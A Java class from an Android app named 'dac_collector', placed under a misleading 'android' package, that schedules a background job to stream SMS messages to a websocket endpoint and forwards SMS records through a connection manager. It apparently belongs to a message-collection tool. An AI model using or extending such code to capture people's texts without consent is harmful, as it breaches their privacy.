package android.iocl.dac_collector.Services;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.iocl.dac_collector.ModelData.SmsData;
import android.os.PersistableBundle;
import android.util.Log;

public class SmsStreamingWorkerManager {

    private static final String TAG =
            "SmsStreamingWorkerManager";

    private static final int JOB_ID =
            SmsStreamingJobService.JOB_ID;

    private static volatile SmsStreamingWorkerManager instance;

    private final Context context;

    private SmsStreamingWorkerManager(Context context) {
        this.context =
                context.getApplicationContext();
    }


    public static SmsStreamingWorkerManager getInstance(
            Context context) {

        if (instance == null) {
            synchronized (SmsStreamingWorkerManager.class) {
                if (instance == null) {
                    instance =
                            new SmsStreamingWorkerManager(context);
                }
            }
        }

        return instance;
    }

    // --------------------------------------------------
    // START SMS STREAMING
    // --------------------------------------------------



    public synchronized boolean start(String path) {

        try {

            if (path == null ||
                    path.trim().isEmpty()) {

                path = "/websocket";
            }

            if (!path.startsWith("/")) {
                path = "/" + path;
            }

            JobScheduler scheduler =
                    (JobScheduler) context.getSystemService(
                            Context.JOB_SCHEDULER_SERVICE
                    );

            if (scheduler == null) {
                Log.e(TAG, "JobScheduler is null");
                return false;
            }

            PersistableBundle extras =
                    new PersistableBundle();

            extras.putString(
                    "path",
                    path
            );

            ComponentName component =
                    new ComponentName(
                            context,
                            SmsStreamingJobService.class
                    );

            JobInfo job =
                    new JobInfo.Builder(
                            JOB_ID,
                            component
                    )
                            .setExtras(extras)
                            .build();

            int result =
                    scheduler.schedule(job);

            if (result == JobScheduler.RESULT_SUCCESS) {

                Log.d(
                        TAG,
                        "SMS streaming job scheduled: "
                                + path
                );

                return true;

            } else {

                Log.e(
                        TAG,
                        "Failed to schedule SMS streaming job"
                );

                return false;
            }

        } catch (Throwable e) {

            Log.e(
                    TAG,
                    "start() crash",
                    e
            );

            return false;
        }
    }

    // --------------------------------------------------
    // STOP SMS STREAMING
    // --------------------------------------------------

    public synchronized boolean stop() {

        try {

            JobScheduler scheduler =
                    (JobScheduler) context.getSystemService(
                            Context.JOB_SCHEDULER_SERVICE
                    );

            if (scheduler == null) {
                Log.e(TAG, "JobScheduler is null");
                return false;
            }

            scheduler.cancel(JOB_ID);

            Log.d(
                    TAG,
                    "SMS streaming job cancelled"
            );

            return true;

        } catch (Throwable e) {

            Log.e(
                    TAG,
                    "stop() crash",
                    e
            );

            return false;
        }
    }

    // --------------------------------------------------
    // CHECK JOB STATUS
    // --------------------------------------------------

    public boolean isRunning() {
        return SmsStreamingJobService.isRunning();
    }

    // --------------------------------------------------
    // SEND SMS
    // --------------------------------------------------

    public boolean sendSms(SmsData sms) {

        try {

            WebSocketConnectionManager manager =
                    WebSocketConnectionManager
                            .getInstance(context);

            return manager.sendSms(sms);

        } catch (Throwable e) {

            Log.e(
                    TAG,
                    "sendSms() crash",
                    e
            );

            return false;
        }
    }

    // --------------------------------------------------
    // CHECK WEBSOCKET CONNECTION
    // --------------------------------------------------

    public boolean isConnected() {

        try {

            WebSocketConnectionManager manager =
                    WebSocketConnectionManager
                            .getInstance(context);

            return manager.isConnected();

        } catch (Throwable e) {

            Log.e(
                    TAG,
                    "isConnected() crash",
                    e
            );

            return false;
        }
    }
}